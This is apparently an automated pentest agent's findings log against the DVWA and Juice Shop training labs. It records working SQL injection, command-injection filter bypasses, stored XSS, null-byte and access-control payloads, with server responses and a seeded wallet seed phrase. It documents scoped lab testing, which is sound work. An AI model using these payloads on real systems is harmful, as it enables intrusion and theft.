state.objective: Discover and behaviorally verify security vulnerabilities across permitted targets (http://dvwa and http://juiceshop:3000) within strict HTTP, LLM, and duration budgets.

endpoints.observation_evidence: [security=high] Results-rendering page for out-of-band SQLi. Page shows 'Security Level: high' and 'Click here to change your ID' linking to session-input.php. No inline id form at HIGH; id comes from session set via session-input.php. Load this page (GET) after submitting injected id to read results (surnames).

[security=high] Command Injection form confirmed at HIGH (page shows 'Security Level: high'). Form POST fields: ip (text), Submit=Submit. HIGH blacklist blocks '; ', '| ' (pipe+space), '&&' — use pipe with no trailing space: 127.0.0.1|whoami. Confirm via www-data in output.

[security=high] Stored XSS guestbook confirmed at HIGH. Fields: txtName (text, maxlength=10), mtxMessage (textarea, maxlength=50 client-side), btnSign=Sign Guestbook (submit), btnClear=Clear Guestbook. HIGH filters
Confirmed server-side security level set to HIGH via POST security=high&seclev_submit=Submit&user_token=[REDACTED] follow-up GET shows 'Security Level: high'. user_token is fresh per-page CSRF token.

acct1 own_basket_id=6 (UserId 22) returns distinct seeded product 'Apple Juice (1000ml)' quantity=3. BOLA: as juiceshop_acct2, GET /rest/basket/6 should return acct1's item. No ownership check on basket id in path.

/ftp/ directory listing (Accept: text/html,application/json) is browsable and exposes acquisitions.md (909 bytes) among other files. Direct GET /ftp/acquisitions.md (allowed .md ext) should return confidential acquisition memo.
JSON login endpoint. Auth-bypass SQLi: email=' OR 1=1-- with any password should return auth token for first user admin@juice-sh.op. JSON body {email,password}.
Benign q=apple returns 200 with product list. SQLi test: q=qwert' => expected HTTP 500 SQLITE_ERROR; 9-col UNION q=x')) UNION SELECT 1,2,3,4,5,6,7,8,9-- => 200.
Unauthenticated GET returns 200 with feedback records disclosing partially-masked author emails (e.g. '...in@juice-sh.op', '...ereum@juice-sh.op') tied to UserId. PII exposure without auth.

Raw GET /ftp/package.json.bak returns HTTP 403 'Only .md and .pdf files are allowed!' (fileServer.js verify). Null-byte bypass path: GET /ftp/package.json.bak%2500.md expected HTTP 200 returning restricted .bak backup content. File listed in /ftp/ as 4291 bytes.
Directory browsable, HTTP 200. Listing exposes sensitive key files: jwt.pub (248 bytes) and premium.key (50 bytes).

[security=medium] SQLi at medium: form now uses method=POST to /vulnerabilities/sqli/ (differs from low GET). Fields: id (rendered as <select> 1-5, but POST accepts arbitrary values), Submit=Submit. Server-side escapes quotes (mysqli_real_escape_string), so string injection fails; use NUMERIC boolean. TRUE: id=1 OR 1=1 returns multiple surnames; FALSE: id=1 AND 1=2 returns zero records. pending_verification.

[security=high] Out-of-band SQLi input page (linked as 'Click here to change your ID' from /vulnerabilities/sqli/). POST id (text, no maxlength) + Submit=Submit stores injected id in session; results then read via GET /vulnerabilities/sqli/. HIGH query appends LIMIT 1 so trailing comment needed, e.g. 1' OR '1'='1' # or UNION SELECT user,password FROM users #.

findings.title: DVWA SQL Injection (boolean) on /vulnerabilities/sqli/ id parameter [security=low]
findings.response_evidence: [security=low] TRUE payload `1' OR '1'='1` returned MULTIPLE seeded user records with distinct surnames: admin(admin), Gordon Brown, Hack Me, Pablo Picasso, Bob Smith. FALSE payload `1' AND '1'='2` returned ZERO records (empty User ID result block). Boolean differential proves SQL injection into the id parameter. DB: mysql.

findings.title: DVWA OS Command Injection on /vulnerabilities/exec/ ip parameter [security=low]
request_sequence: POST /vulnerabilities/exec/ with form body ip=127.0.0.1; whoami&Submit=Submit
findings.response_evidence: [security=low] Response pre-block shows ping output for 127.0.0.1 followed by the injected command output `www-data`, proving the appended `; whoami` executed as the web process identity. Exact trailing line of output: `www-data`.

findings.title: DVWA Stored XSS on /vulnerabilities/xss_s/ mtxMessage parameter [security=low]
request_sequence: POST /vulnerabilities/xss_s/ with form body txtName=canary&mtxMessage=<script id="test_token">window.xss_flag=1</script>&btnSign=Sign Guestbook
findings.response_evidence: [security=low] The canary script `<script id=\"test_token\">window.xss_flag=1</script>` was stored in the guestbook via mtxMessage and rendered unescaped on the page. Injected element present in DOM: #test_token inner_html = `window.xss_flag=1`.
findings.browser_js_evidence: browser_eval_js("window.xss_flag") returned result: 1 — stored script executed in authenticated dvwa_admin browser context. browser_read_dom("#test_token") inner_text = "window.xss_flag=1".

findings.title: Cross-User Basket Access / BOLA on /rest/basket/{id}
request_sequence: GET /rest/basket/6 as juiceshop_acct1 (own_basket_id=6, UserId=22) -> 200 returns Apple Juice (1000ml) qty=3
GET /rest/basket/6 as juiceshop_acct2 (own_basket_id=7) -> 200 returns the SAME basket (id=6, UserId=22)
findings.response_evidence: acct1 owns basket id 6 (own_basket_id=6, UserId=22) containing distinct seeded product 'Apple Juice (1000ml)' quantity=3. As juiceshop_acct2 (own_basket_id=7), GET /rest/basket/6 returned HTTP 200 with acct1's basket: {"id":6,"UserId":22,"Products":[{"name":"Apple Juice (1000ml)",...,"BasketItem":{"BasketId":6,"quantity":3}}]}. No ownership check on the basket id in the path — acct2 retrieved acct1's distinct item (Apple Juice (1000ml), qty=3).

findings.title: Confidential Document Exposure via Open /ftp/ Directory Listing (acquisitions.md)
request_sequence: GET /ftp/ (Accept: text/html,application/json) as unauth -> 200 directory listing including acquisitions.md (909 bytes)
GET /ftp/acquisitions.md as unauth -> 200 text/markdown confidential memo
findings.response_evidence: Unauthenticated GET /ftp/ returned a browsable directory listing including 'acquisitions.md 909'. Direct GET /ftp/acquisitions.md returned HTTP 200 (text/markdown) with the confidential memo: "# Planned Acquisitions > This document is confidential! Do not distribute! Our company plans to acquire several competitors within the next year. This will have a significant stock market impact...". Confidential document disclosed to unauthenticated users.

findings.title: Login Authentication-Bypass SQL Injection on POST /rest/user/login
request_sequence: POST /rest/user/login as unauth JSON {"email":"' OR 1=1--","password":"anything"} -> 200 with auth token for admin@juice-sh.op
findings.response_evidence: Unauthenticated POST with email=' OR 1=1-- and arbitrary password returned HTTP 200: {"authentication":{"token":"[REDACTED_JWT]","bid":1,"umail":"admin@juice-sh.op"}}. The SQLi injected into the email field bypassed authentication and returned a valid JWT auth token for the first user (admin@juice-sh.op, bid=1).

findings.title: Product-Search SQL Injection (SQLITE_ERROR + 9-column UNION)
findings.response_evidence: Single quote q=qwert' => HTTP 500 body: "Error: SQLITE_ERROR: near \"'%'\": syntax error" (raw unparameterized SQL confirmed). 9-column UNION probe q=x')) UNION SELECT 1,2,3,4,5,6,7,8,9-- => HTTP 200 with success JSON where injected literals map into columns: {"status":"success","data":[{"id":1,"name":2,"description":3,"price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9}]} — proving 9-column UNION injection succeeds without error.

findings.title: Unauthenticated User-Feedback PII Exposure
request_sequence: GET /api/Feedbacks (unauth session, no Authorization header) => HTTP 200
findings.response_evidence: Unauthenticated GET returns HTTP 200 with feedback records tied to UserId that disclose author emails in the comment field. Disclosed PII examples: "I love this shop! Best products in town! Highly recommended! (***in@juice-sh.op)" (UserId:1), "Nothing useful available here! (***der@juice-sh.op)" (UserId:3), and UserId:21 feedback leaking email "(***ereum@juice-sh.op)" together with a 12-word wallet seed phrase "purpose betray marriage blame crunch monitor spin slide donate sport lift clutch". No auth token required — PII disclosed to anonymous users.

findings.title: Poison Null-Byte Path Traversal bypasses /ftp file-extension filter
request_sequence: GET /ftp/package.json.bak => HTTP 403 (Only .md and .pdf files are allowed!)
findings.response_evidence: Raw path GET /ftp/package.json.bak => HTTP 403, body: "Error: Only .md and .pdf files are allowed! at verify (/juice-shop/build/routes/fileServer.js:55:18)". Null-byte bypass GET /ftp/package.json.bak%2500.md => HTTP 200, content-type application/octet-stream, returning the restricted backup file content. Excerpt: {"name":"juice-shop","version":"6.2.0-SNAPSHOT","description":"An intentionally insecure JavaScript Web Application",...,"author":"Björn Kimminich <bjoern.kimminich@owasp.org> ...","dependencies":{"express":"~4.16","express-jwt":"0.1.3",...,"sqlite3":"~3.1.13"}...}. Confirms the %2500 (URL-encoded null byte) + .md suffix bypasses the extension allowlist and exfiltrates the blocked .bak file.

findings.title: Exposed Encryption-Keys Directory via Open Directory Listing
findings.response_evidence: HTTP 200, content-type text/html. Directory listing is browsable without authentication. Visible text: "listing directory /encryptionkeys/ ~ / encryptionkeys / Name Size Modified jwt.pub 248 12/19/2023 1:12:12 PM premium.key 50 12/19/2023 1:12:12 PM". Sensitive key files exposed: jwt.pub (248 bytes) and premium.key (50 bytes), both directly linked (http://juiceshop:3000/encryptionkeys/jwt.pub and .../premium.key).

findings.title: SQL Injection (numeric boolean) at DVWA medium security — /vulnerabilities/sqli/
findings.response_evidence: [security=medium] Level-specific numeric boolean payload (quotes are escaped via mysqli_real_escape_string, so no quotes used). TRUE payload id=1 OR 1=1 returned MULTIPLE seeded records/surnames: admin (admin), Gordon Brown, Hack Me, Pablo Picasso, Bob Smith — i.e. all 5 users. FALSE payload id=1 AND 1=2 returned ZERO records (no First name/Surname pre-blocks rendered). Page confirms 'Security Level: medium'. This boolean-differential (5 rows vs 0 rows) proves SQL injection.

findings.title: OS Command Injection (pipe bypass) at DVWA medium security — /vulnerabilities/exec/
findings.response_evidence: [security=medium] Level-specific pipe payload used because medium blacklists ';' and '&&'. Payload ip=127.0.0.1| whoami executed the injected command; response output pre-block contains the web-process identity: "www-data". Page confirms 'Security Level: medium'. This proves OS command injection via the pipe metacharacter bypassing the medium blacklist.

findings.title: SQL Injection (out-of-band session input) — DVWA HIGH security
request_sequence: POST /vulnerabilities/sqli/session-input.php (dvwa_admin) form: id=1' AND '1'='2' # & Submit=Submit  [FALSE baseline]
findings.response_evidence: [security=high] Out-of-band injection via session-input.php; query appends LIMIT 1 so trailing comment (#) required. TRUE payload `1' OR '1'='1' #` rendered 5 seeded user records: First name/Surname = admin/admin, Gordon/Brown, Hack/Me, Pablo/Picasso, Bob/Smith (verbatim pre_blocks: "ID: 1' OR '1'='1' # First name: admin Surname: admin" ... "Bob Surname: Smith"). FALSE baseline `1' AND '1'='2' #` rendered ZERO records on the subsequent GET /vulnerabilities/sqli/. Page confirms "Security Level: high". Boolean differential (5 rows vs 0 rows) proves injection.

findings.title: OS Command Injection — DVWA HIGH security
findings.response_evidence: [security=high] HIGH blacklist blocks '; ', '| ' (pipe+space), '&&'. Bypass payload `127.0.0.1|whoami` (pipe with NO trailing space) executed. Response output (pre_blocks) contained the web-process identity: "www-data". Page confirms "Security Level: high". Command injection confirmed.

request_sequence: GET http://dvwa/security.php (dvwa_admin) -> 'Security level is currently: high'
POST http://dvwa/vulnerabilities/xss_s/ (dvwa_admin) form_data: txtName=hi&mtxMessage=&btnSign=Sign Guestbook

findings.browser_js_evidence: browser_eval_js("window.xss_flag") => 1 ; stored markup from DOM: [xss_flag=1]
